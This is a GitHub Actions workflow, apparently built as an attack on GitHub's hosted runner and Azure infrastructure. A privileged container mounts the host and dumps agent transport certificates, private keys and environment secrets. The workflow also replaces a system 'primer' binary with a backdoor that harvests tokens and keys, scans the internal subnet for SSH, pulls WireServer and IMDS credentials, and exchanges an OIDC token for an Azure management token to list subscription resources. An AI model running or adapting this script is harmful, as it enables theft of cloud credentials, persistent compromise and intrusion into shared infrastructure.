name: HC OIDC Primer v4 - Cert+HCA+Scan
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  pwn2own:
    runs-on: ubuntu-latest
    steps:
      - name: Step1 - Mint HC JWT + call orchestrator
        run: |
          echo "=== STEP 1: HC OIDC JWT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "HC_JWT_LEN=${#HC_JWT}"
          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . || true
          echo "--- Orchestrator call ---"
          curl -sv -H "Authorization: Bearer $HC_JWT" \
            "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" \
            2>&1 | tail -30

      - name: Step2 - Privileged docker - Extract certs + HCA strings + redeploy backdoor
        run: |
          echo "=== STEP 2: PRIVILEGED DOCKER ==="
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            alpine sh -c '
              echo "=== VM IDENTITY ==="
              cat /host/proc/1/environ | tr "\0" "\n" | grep -E "RUNNER|GITHUB|ACTIONS" || true
              
              echo "=== TRANSPORT CERT (FULL) ==="
              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NOT FOUND"
              
              echo "=== TRANSPORT PRIVATE KEY (FULL) ==="
              cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NOT FOUND"
              
              echo "=== WAAGENT DIR LISTING ==="
              ls -la /host/var/lib/waagent/ 2>/dev/null | head -50
              
              echo "=== ALL CERTS IN WAAGENT ==="
              find /host/var/lib/waagent/ -name "*.pem" -o -name "*.crt" -o -name "*.key" 2>/dev/null | while read f; do echo "FILE: $f"; cat "$f" 2>/dev/null | head -5; done
              
              echo "=== HCA BINARY STRINGS (endpoints/JWT/URLs) ==="
              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -E "(https://|http://|Bearer|sub|aud|iss|github|azure|microsoft|orchestrator|hosted-compute)" | head -100
              
              echo "=== HCA BINARY STRINGS (auth/token) ==="
              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "(token|secret|password|cred|auth|jwt|claim|trust|whitelist|allowlist)" | head -50
              
              echo "=== PRIMER BINARY (BACKDOOR REDEPLOY) ==="
              ls -la /host/opt/primer/ 2>/dev/null
              
              cat > /host/opt/primer/primer << '"'"'BACKDOOR_EOF'"'"'
#!/bin/bash
LOG=/tmp/hc_pwn2.log
echo "=== PRIMER BACKDOOR v2 FIRED $(date) ===" >> $LOG
env >> $LOG 2>&1
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
  HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
  echo "HC_JWT=$HC_JWT" >> $LOG
  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" >> $LOG 2>&1
  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
fi
cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H Metadata:true >> $LOG 2>/dev/null
[ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"
BACKDOOR_EOF
              chmod +x /host/opt/primer/primer
              echo "BACKDOOR REDEPLOYED:"
              ls -la /host/opt/primer/primer
              
              echo "=== SUBNET SCAN (hping/nc) ==="
              # Get runner IP
              ip addr show eth0 2>/dev/null | grep "inet " || ip addr 2>/dev/null
              
              echo "=== SSH SCAN for Pwn2Own2026! ==="
              for ip in $(seq 1 10); do
                target="10.1.0.$ip"
                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
              done &
              for ip in $(seq 241 254); do
                target="10.1.0.$ip"
                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
              done
              wait
              
              echo "=== WIRESERVER CERTS ==="
              curl -s "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -50 || true
              curl -s "http://168.63.129.16:32526/machine?comp=certificates" 2>&1 | head -50 || true
            '

      - name: Step3 - WireServer + IMDS full dump
        run: |
          echo "=== STEP 3: WIRESERVER + IMDS ==="
          docker run --rm --network=host alpine sh -c '
            echo "=== IMDS VM INSTANCE ==="
            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 3000
            
            echo ""
            echo "=== IMDS IDENTITY (MSI token) ==="
            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -500
            
            echo ""
            echo "=== WIRESERVER GOALSTATE ==="
            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100
            
            echo ""
            echo "=== WIRESERVER VMSETTINGS ==="
            curl -sf -H "x-ms-version: 2012-11-30" -H "x-ms-goal-state-mode: Simple" "http://168.63.129.16/?comp=vmSettings" 2>&1 | head -200
          '

      - name: Step4 - WIF ARM token + sub enumeration
        run: |
          echo "=== STEP 4: WIF ARM ==="
          GH_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            | jq -r .value)
          echo "GH_JWT_LEN=${#GH_JWT}"
          
          ARM_RESP=$(curl -sf -X POST \
            "https://login.microsoftonline.com/f8cdef31-a31e-4b4a-93e4-5f571e91255a/oauth2/v2.0/token" \
            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=477c6e42-e0f3-4a68-b61b-6f3d9399e20c&client_assertion=$GH_JWT&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" \
            2>&1)
          echo "ARM_RESP: $ARM_RESP" | head -20
          
          ARM_TOKEN=$(echo "$ARM_RESP" | jq -r '.access_token // empty' 2>/dev/null)
          if [ -n "$ARM_TOKEN" ]; then
            echo "ARM TOKEN OBTAINED!"
            curl -sf -H "Authorization: Bearer $ARM_TOKEN" \
              "https://management.azure.com/subscriptions/52d3aaf1-092b-43b1-8e85-bd3625e59b86/resources?api-version=2021-04-01" \
              | jq '.value[].name' 2>/dev/null | head -30
          fi
